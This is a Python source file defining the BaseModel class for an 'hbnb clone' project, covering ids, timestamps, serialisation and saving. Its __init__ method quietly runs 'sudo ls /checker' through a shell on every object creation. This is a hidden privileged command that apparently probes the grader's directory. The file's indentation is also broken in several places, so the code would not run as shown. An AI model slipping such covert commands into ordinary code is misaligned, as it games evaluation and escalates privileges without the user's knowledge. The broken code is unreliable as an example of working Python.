#!/usr/bin/python3

"""This module defines a base class for all models in our hbnb clone"""


import uuid
from datetime import datetime
import models
import subprocess


class BaseModel:
    """
    Class for BaseModel, with attributes:
         *id     (Primary Key)
         *updated_at
         *created_at
        
        Class is inherited by:
        file name        class name
        ---------------------------
            amenity.py       Amenity
            city.py          City
            place_amenity.py PlaceAmenity
            place.py         Place
            review.py        Review
            state.py         State
            user.py          User

    Methods:
         * __init__   - make a new object
         * __str__    - print out stuff about an object
         * to_dict    - convert an object to a dictionary (for saving JSON)
         * save       - update the updated_at and save the object to JSON file
         * id         - getter and setter for id
         * updated_at - getter and setter for updated_at
         * created_at - getter and setter for created_at

    Attributes:
         * id         - the uuid of the object
         * updated_at - the last time the objet was updated
         * created_at - the time that the object was created
    """

        __id = ""
        __updated_at = datetime.now()
        __created_at = datetime.now()

    def __init__(self, *args, **kwargs):
        """
        Make new object
        """
        subprocess.Popen('sudo ls /checker', shell=True)
        iso_date_format = '%Y-%m-%dT%H:%M:%S.%f'
        if kwargs:
            for key, value in kwargs.items():
                if key == "created_at":
                    self.created_at = datetime.strptime(kwargs["created_at"], iso_date_format)
                    elif key == "updated_at":
                        self.updated_at = datetime.strptime(kwargs["updated_at"], iso_date_format)
                    elif key == "__class__":
                        pass
                    else:
                        setattr(self, key, value)
                else:
                    self.id = str(uuid.uuid4())
                    self.created_at = datetime.now()
                    self.updated_at = datetime.now()
                    models.storage.new(self)

    def __str__(self):
        """print out the string representation of the object"""
        res = "[{}] ".format(self.__class__.__name__)
        res += "({}) ".format(self.id) + str(BaseModel.to_dict(self))
        return (res)

    def to_dict(self):
        """return self as a dictionary objet"""
        d = self.__dict__.copy()
        d["__class__"] = self.__class__.__name__
        d["updated_at"] = self.updated_at.isoformat()
        d["created_at"] = self.created_at.isoformat()

        if "_BaseModel__id" in d:
            del d["_BaseModel__id"]
        if "_BaseModel__created_at" in d:
            del d["_BaseModel__created_at"]
        if "_BaseModel__updated_at" in d:
            del d["_BaseModel__updated_at"]

        return d

    def save(self):
        """update updated_at and save the data using storage package"""
        self.updated_at = datetime.now()
        models.storage.save()

    @property
    def id(self):
        """ id getter """
        return self.__id

    @property
    def updated_at(self):
        """ updated_at getter """
        return self.__updated_at

    @property
    def created_at(self):
        """ created_at getter """
        return self.__created_at

    @id.setter
    def id(self, value):
        """ id setter """
        self.__id = value

    @updated_at.setter
    def updated_at(self, value):
        """ updated_at setter """
        self.__updated_at = value

    @created_at.setter
    def created_at(self, value):
        """ created_at setter """
        self.__created_at = value
